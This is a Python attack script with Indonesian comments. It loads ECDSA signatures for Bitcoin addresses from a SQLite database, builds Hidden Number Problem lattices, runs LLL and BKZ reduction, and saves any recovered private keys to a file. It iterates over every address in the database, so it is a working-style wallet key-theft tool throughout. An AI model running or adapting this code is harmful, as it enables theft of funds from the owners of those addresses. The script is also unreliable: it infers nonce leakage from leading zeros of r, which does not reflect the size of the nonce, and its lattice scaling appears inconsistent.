import sqlite3
import gmpy2
import time
import sys
import os
from fpylll import IntegerMatrix, BKZ, LLL, GSO, FPLLL
from gmpy2 import invert
from colorama import Fore, Style, init
from bitcoin import privtopub, encode_pubkey, pubtoaddr

# Init Colorama
init(autoreset=True)

# ==========================================
# CONFIGURATION
# ==========================================
# Ganti nama database sesuai kebutuhan
DB_FILE = "valid_nonce_reuse.db" 
# Curve Parameters (secp256k1)
ORDER_N = 115792089237316195423570985008687907852837564279074904382605163141518161494337
# Jumlah signature maksimal yang diambil untuk lattice
LATTICE_DIM = 40  
# Block size untuk BKZ (makin tinggi makin kuat tapi lambat, default 40-60)
BKZ_BLOCK_SIZE = 45 

# ==========================================
# 1. DATABASE & DATA FETCHING
# ==========================================

def get_signatures_from_db(db_path, address, limit=100):
    """
    Mengambil signature (r, s, z) dari database SQLite berdasarkan address.
    Diadaptasi dari lapti.py.
    """
    if not os.path.exists(db_path):
        print(Fore.RED + f"[!] Database not found: {db_path}")
        return [], 0

    print(Fore.CYAN + f"[*] Fetching data for: {address}")
    try:
        conn = sqlite3.connect(db_path)
        cur = conn.cursor()
        # Mengambil data r, s, z (hash)
        cur.execute("SELECT r, s, z FROM signatures WHERE address=?", (address,))
        rows = cur.fetchall()
        conn.close()

        if not rows:
            print(Fore.YELLOW + "    [!] No signatures found in DB.")
            return [], 0

        signatures = []
        max_leak = 0

        for row in rows:
            try:
                # Handle potensi format hex string atau integer
                r_val = int(str(row[0]), 16) if 'x' in str(row[0]) else int(row[0])
                s_val = int(str(row[1]), 16) if 'x' in str(row[1]) else int(row[1])
                z_val = int(str(row[2]), 16) if 'x' in str(row[2]) else int(row[2])

                # Filter dasar validitas ECDSA
                if r_val <= 0 or r_val >= ORDER_N or s_val <= 0 or s_val >= ORDER_N:
                    continue
                if gmpy2.gcd(s_val, ORDER_N) != 1:
                    continue

                # Estimasi kebocoran bit (Leading Zeros pada r)
                # Semakin kecil r, semakin besar kemungkinan k kecil (MSB 0)
                leak = 256 - r_val.bit_length()
                if leak < 0: leak = 0
                
                if leak > max_leak:
                    max_leak = leak

                signatures.append({
                    'r': r_val,
                    's': s_val,
                    'z': z_val,
                    'leak': leak
                })
            except Exception as e:
                continue

        # Sort signature berdasarkan kebocoran terbesar (r terkecil)
        # Ini penting untuk HNP agar mendapatkan constraint paling ketat
        signatures.sort(key=lambda x: x['leak'], reverse=True)
        
        # Ambil subset terbaik
        final_sigs = signatures[:limit]
        
        print(Fore.GREEN + f"    [+] Loaded {len(final_sigs)} signatures. Max detected leak: {max_leak} bits.")
        return final_sigs, max_leak

    except Exception as e:
        print(Fore.RED + f"[!] DB Error: {e}")
        return [], 0

# ==========================================
# 2. LATTICE CONSTRUCTION (HNP)
# ==========================================

def build_hnp_lattice(signatures, bit_leak):
    """
    Membangun matriks Lattice untuk Hidden Number Problem (HNP).
    Menggunakan fpylll IntegerMatrix.
    """
    num_sigs = len(signatures)
    dim = num_sigs + 2
    
    # Asumsi bound Nonce: k < 2^(256 - leak)
    # Kita berikan margin error 1 bit agar tidak terlalu strict
    B = 2 ** (256 - bit_leak + 1)
    
    # Scaling factor untuk menyeimbangkan matrix
    # Tujuannya agar error (k) sebanding dengan modulus N
    scale = ORDER_N * 2 # Weighting
    
    # Inisialisasi Matriks Dimensi (m+2) x (m+2)
    A = IntegerMatrix(dim, dim)
    
    # Precompute t dan u untuk setiap signature
    # k = s^-1 * z + s^-1 * r * dA  (mod n)
    # k = u + t * dA (mod n)
    # k - t * dA - u = 0 (mod n)
    
    ts = []
    us = []
    
    for sig in signatures:
        s_inv = int(invert(sig['s'], ORDER_N))
        t = (sig['r'] * s_inv) % ORDER_N
        u = (sig['z'] * s_inv) % ORDER_N
        ts.append(t)
        us.append(u)

    # --- Construct Matrix ---
    # Row 0..m-1 : Modulus N (scaled)
    # Row m      : Koefisien t (scaled) & dA (weight 1/kecil)
    # Row m+1    : Konstanta u (scaled) & Target/Bias
    
    # 1. Diagonal Modulus
    for i in range(num_sigs):
        A[i, i] = ORDER_N * scale

    # 2. Baris Private Key (dA)
    # Kolom 0..m-1 diisi t_i * scale
    for i in range(num_sigs):
        A[num_sigs, i] = ts[i] * scale
    
    # Posisi diagonal dA (kolom ke-m)
    # Kita isi 1 atau nilai kecil agar dA muncul di vektor pendek
    A[num_sigs, num_sigs] = 1 
    A[num_sigs, dim-1] = 0

    # 3. Baris Konstanta (u) / Target
    # Kolom 0..m-1 diisi u_i * scale
    for i in range(num_sigs):
        A[dim-1, i] = us[i] * scale
    
    A[dim-1, num_sigs] = 0
    # Kolom terakhir (diagonal) diisi scale * modulus/bound
    # Ini untuk menampung konstanta persamaan
    A[dim-1, dim-1] = ORDER_N

    return A

# ==========================================
# 3. VERIFICATION
# ==========================================

def verify_key(priv_int, target_address):
    """
    Memverifikasi apakah private key cocok dengan address target.
    """
    try:
        priv_hex = hex(priv_int)[2:].zfill(64)
        pub = privtopub(priv_hex)
        
        # Cek Compressed Address
        addr_c = pubtoaddr(encode_pubkey(pub, "bin_compressed"))
        if addr_c == target_address:
            return True, priv_hex, addr_c
            
        # Cek Uncompressed Address
        addr_u = pubtoaddr(encode_pubkey(pub, "bin"))
        if addr_u == target_address:
            return True, priv_hex, addr_u
            
        return False, None, None
    except:
        return False, None, None

# ==========================================
# 4. MAIN ATTACK LOGIC
# ==========================================

def solve_lattice(signatures, max_leak, address):
    """
    Menjalankan reduksi basis lattice (LLL/BKZ) untuk mencari private key.
    """
    # Jika leak terlalu kecil, attack kemungkinan besar gagal
    if max_leak < 2:
        print(Fore.YELLOW + "    [!] Leak too small (< 2 bits). Skipping.")
        return None

    print(Fore.MAGENTA + f"    [*] Building Lattice {len(signatures)+2}x{len(signatures)+2}...")
    
    # Construct Lattice
    M = build_hnp_lattice(signatures, max_leak)
    
    # Start Timer
    start_time = time.time()
    
    # 1. LLL Reduction (Cepat)
    print(Fore.YELLOW + "    [>] Running LLL reduction...")
    LLL.reduction(M)
    
    # Cek hasil LLL terlebih dahulu (seringkali cukup)
    priv = check_matrix_rows(M, address, len(signatures))
    if priv:
        return priv

    # 2. BKZ Reduction (Lebih kuat jika LLL gagal)
    print(Fore.YELLOW + f"    [>] Running BKZ-{BKZ_BLOCK_SIZE} reduction (Deep search)...")
    param = BKZ.Param(block_size=BKZ_BLOCK_SIZE, strategies=BKZ.DEFAULT_STRATEGY)
    BKZ.reduction(M, param)
    
    duration = time.time() - start_time
    print(Fore.CYAN + f"    [i] Reduction finished in {duration:.2f}s")

    # Cek hasil BKZ
    priv = check_matrix_rows(M, address, len(signatures))
    return priv

def check_matrix_rows(M, address, num_sigs):
    """
    Memeriksa setiap baris dari matriks yang sudah direduksi
    untuk menemukan kandidat private key.
    """
    # Private key biasanya berada di kolom ke-(num_sigs) dari vektor pendek
    # Struktur baris: [error_0, ..., error_m, priv_key, const]
    
    idx_priv = num_sigs
    
    for i in range(M.nrows):
        # Ambil nilai potensial dari kolom dA
        potential_priv = int(M[i, idx_priv])
        
        candidates = [potential_priv, -potential_priv]
        
        for cand in candidates:
            # Filter range valid
            if cand <= 0 or cand >= ORDER_N:
                # Cek modulo N juga (kadang lattice menghasilkan dA + N)
                cand_mod = cand % ORDER_N
                if cand_mod > 0:
                    candidates.append(cand_mod)
                continue

            # Verifikasi ke Address
            is_valid, priv_hex, addr_found = verify_key(cand, address)
            if is_valid:
                print(Fore.LIGHTGREEN_EX + "\n" + "!"*60)
                print(f"[SUCCESS] PRIVATE KEY FOUND!")
                print(f"Target Addr : {address}")
                print(f"Found Addr  : {addr_found}")
                print(f"Private Key : {priv_hex}")
                print("!"*60 + "\n")
                
                # Simpan ke file
                with open("found_keys.txt", "a") as f:
                    f.write(f"{address}:{priv_hex}\n")
                return priv_hex
    return None

# ==========================================
# 5. ENTRY POINT
# ==========================================

def main():
    # Cek database
    if not os.path.exists(DB_FILE):
        print(Fore.RED + f"[!] {DB_FILE} not found. Please place it in the same directory.")
        return

    # Load target dari file teks (opsional, atau ambil semua unik dari DB)
    # Disini kita ambil list address unik dari DB untuk efisiensi demo
    try:
        conn = sqlite3.connect(DB_FILE)
        cur = conn.cursor()
        print(Fore.CYAN + "[*] Reading unique addresses from DB...")
        cur.execute("SELECT DISTINCT address FROM signatures")
        addresses = [r[0] for r in cur.fetchall()]
        conn.close()
    except Exception as e:
        print(Fore.RED + f"[!] Failed to read addresses: {e}")
        return

    print(Fore.GREEN + f"[*] Found {len(addresses)} unique targets.")

    for i, address in enumerate(addresses):
        print(f"\n=== Target {i+1}/{len(addresses)}: {address} ===")
        
        # 1. Fetch
        sigs, max_leak = get_signatures_from_db(DB_FILE, address, limit=LATTICE_DIM)
        
        if len(sigs) < 5:
            print(Fore.RED + "    [!] Not enough signatures (<5). Skipping.")
            continue
            
        # 2. Attack
        # Kita coba attack dengan asumsi leak yang terdeteksi
        result = solve_lattice(sigs, max_leak, address)
        
        # Jika gagal, kadang leak dideteksi terlalu tinggi (overestimate).
        # Coba kurangi bound sedikit (relax constraint).
        if not result and max_leak > 3:
            print(Fore.YELLOW + "    [!] Retrying with relaxed constraints (-1 bit)...")
            solve_lattice(sigs, max_leak - 1, address)

if __name__ == "__main__":
    main()
